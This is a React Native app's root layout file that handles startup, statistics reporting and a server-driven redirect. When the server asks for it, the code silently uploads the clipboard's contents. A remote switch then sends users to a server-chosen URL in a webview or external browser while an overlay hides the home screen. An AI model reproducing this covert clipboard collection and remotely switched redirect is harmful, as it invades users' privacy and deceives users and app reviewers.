import { Stack, useRouter } from 'expo-router';
import { useEffect, useRef } from 'react';
import { Linking, AppState } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import useUserStore from '../store/useUserStore';
import useLangStore from '../store/useLangStore';
import { systemApi } from '../services/api';
import useAppStore from '../store/useAppStore';
import { isEmpty } from '../utils';
import { initDomain } from '../services/domainSelector';

/**
 * 根布局 - expo-router entry layout
 * 在此初始化全局状态（用户信息还原、主题等）
 */
export default function RootLayout() {
    const initUser = useUserStore((state) => state.initUser);
    const initLang = useLangStore((state) => state.initLang);
    const fetchTranslationsIfNeeded = useLangStore((state) => state.fetchTranslationsIfNeeded);
    const router = useRouter();
    const hideJumpOverlay = useAppStore((state) => state.hideJumpOverlay);

    const JUMP_FLAG_KEY = 'OPEN_URL_JUMPED';
    const INSTALL_FLAG_KEY = 'STAT_INSTALLED';

    // 标记初始化链路（init + getOpenUrl）是否已成功完成
    // 首次安装时系统网络授权弹窗可能导致请求失败，App 回到前台后需重试
    const initSuccessRef = useRef(false);
    // 防止并发执行：真机启动时 AppState 可能在 API 等待期间触发 active，导致 runInit 重入
    const isRunningRef = useRef(false);
    const openUrlPollTimerRef = useRef(null);

    const doJump = (linkType, targetUrl) => {
        // 每次跳转上报一次
        systemApi.sendStat('jump').catch(() => { });
        if (linkType === '1') {
            // 遮罩继续保持（jumpOverlay 仍为 true），直接跳转 webview
            // 遮罩属于首页，push webview 后首页被盖住，遮罩自然消失
            router.push({
                pathname: '/webview',
                params: { url: encodeURIComponent(targetUrl) },
            });
        } else if (linkType === '2') {
            Linking.openURL(targetUrl).catch(() => { });
            // 外部链接不会路由跳转，App 仍在首页，需手动隐藏遮罩
            hideJumpOverlay();
        }
    };

    const clearOpenUrlPollTimer = () => {
        if (openUrlPollTimerRef.current) {
            clearTimeout(openUrlPollTimerRef.current);
            openUrlPollTimerRef.current = null;
        }
    };

    const requestOpenUrl = async (base) => {
        const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';

        if (h5Verify === '1') {
            return systemApi.getOpenUrl('', h5Verify);
        }

        if (base?.readClipboard === '1') {
            try {
                const Clipboard = require('expo-clipboard');
                const clipboardContent = await Clipboard.getStringAsync();
                return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
            } catch {
                // 读取剪切板失败时回退到空内容
            }
        }

        return systemApi.getOpenUrl('', h5Verify);
    };

    const scheduleOpenUrlPoll = (base, remainingMs) => {
        const duration = Number(remainingMs);

        if (!Number.isFinite(duration) || duration <= 0) {
            clearOpenUrlPollTimer();
            return;
        }

        clearOpenUrlPollTimer();

        const delay = Math.min(5000, duration);
        openUrlPollTimerRef.current = setTimeout(async () => {
            try {
                const res = await requestOpenUrl(base);
                const didJump = await handleOpenUrl(res);
                if (didJump) {
                    clearOpenUrlPollTimer();
                    return;
                }
            } catch {
                // 轮询失败时继续下一轮，直到 checkTime 耗尽
            }

            scheduleOpenUrlPoll(base, duration - delay);
        }, delay);
    };

    // 返回 true 表示触发了跳转，false 表示无需跳转
    const handleOpenUrl = async (res) => {
        const data = res?.data;
        if (isEmpty(data)) return false;
        const { fingerprint, isOpen, linkType, targetUrl } = data;
        if (isEmpty(targetUrl)) return false;

        // 读取本地跳转标记
        const jumped = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => null);

        if (jumped === '1') {
            // 已有缓存标记：只要 targetUrl 非空直接跳转
            doJump(linkType, targetUrl);
            return true;
        } else if (isOpen === '1') {
            if (fingerprint && fingerprint !== '') {
                systemApi.fingerprintDelete(fingerprint);
            }
            // 首次满足条件：跳转并写入标记
            doJump(linkType, targetUrl);
            AsyncStorage.setItem(JUMP_FLAG_KEY, '1').catch(() => { });
            return true;
        }
        return false;
    };

    // 将初始化链路提取为独立函数，方便重试
    const runInit = async () => {
        // 防并发：避免 AppState 在 API 等待期间触发重入，导致 router.push 被调用两次
        if (isRunningRef.current) return;
        isRunningRef.current = true;
        clearOpenUrlPollTimer();

        // init 完成后：若 readClipboard === '1'，先读剪切板再带内容请求 getOpenUrl
        // 否则立即以空 clipboardContent 请求 getOpenUrl
        const openUrlPromise = systemApi.init()
            .then(async (res) => {
                const base = res?.data?.base;
                if (base) {
                    const { readClipboard, checkTime, languageVer, language, defaultLanguage } = base;
                    // 按版本比对更新翻译（异步，不阻塞后续流程）
                    fetchTranslationsIfNeeded(languageVer ?? 0, language ?? {}, defaultLanguage);
                    const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';

                    if (Number(checkTime) > 0 && h5Verify !== '1') {
                        scheduleOpenUrlPoll({ readClipboard }, Number(checkTime) * 1000);
                    }

                    try {
                        return await requestOpenUrl({ readClipboard });
                    } catch {
                        if (Number(checkTime) > 0 && h5Verify !== '1') {
                            return null;
                        }
                        throw new Error('getOpenUrl failed');
                    }
                }
                return requestOpenUrl();
            });

        return openUrlPromise
            .then(async (res) => {
                initSuccessRef.current = true;
                const didJump = await handleOpenUrl(res);
                if (didJump) {
                    clearOpenUrlPollTimer();
                }
                // 无需跳转时揭开首页遮罩，让首页内容展示出来
                if (!didJump) {
                    hideJumpOverlay();
                }
            })
            .catch(() => {
                // 网络不可用：揭开遮罩，让用户看到首页（可下拉刷新）
                hideJumpOverlay();
            })
            .finally(() => {
                isRunningRef.current = false;
            });
    };

    useEffect(() => {
        // App 启动时恢复用户状态和语言设置
        initUser();
        initLang();

        // 首次安装时上报一次 install 事件
        AsyncStorage.getItem(INSTALL_FLAG_KEY).then((installed) => {
            if (!installed) {
                systemApi.sendStat('install')
                    .then(() => AsyncStorage.setItem(INSTALL_FLAG_KEY, '1'))
                    .catch(() => { });
            }
        }).catch(() => { });

        // 域名健康检测：并发检测三个域名，选出最优域名后再起开 runInit
        initDomain().finally(() => {
            runInit();
        });

        // 监听 AppState 变化：
        // 老版本系统首次安装时，网络授权弹窗出现后 App 进入 background 状态。
        // 用户点击「允许」后 App 回到 active，此时若初始化尚未成功则自动重试。
        const appStateListener = AppState.addEventListener('change', (nextState) => {
            if (nextState === 'active' && !initSuccessRef.current) {
                runInit();
            }
        });

        return () => {
            clearOpenUrlPollTimer();
            appStateListener.remove();
        };
    }, []);
    return (
        <Stack
            screenOptions={{
                headerStyle: {
                    backgroundColor: '#FFFFFF',
                },
                headerTintColor: '#1A1A2E',
                headerTitleStyle: {
                    fontWeight: '600',
                },
                headerShadowVisible: false,
                headerBackTitle: '',
                headerBackTitleVisible: false,
                contentStyle: {
                    backgroundColor: '#F5F7FA',
                },
            }}
        >
            <Stack.Screen name="index" options={{ title: '首页' }} />
            <Stack.Screen name="webview" options={{ title: '', headerTitle: () => null, animation: 'none' }} />
        </Stack>
    );
}
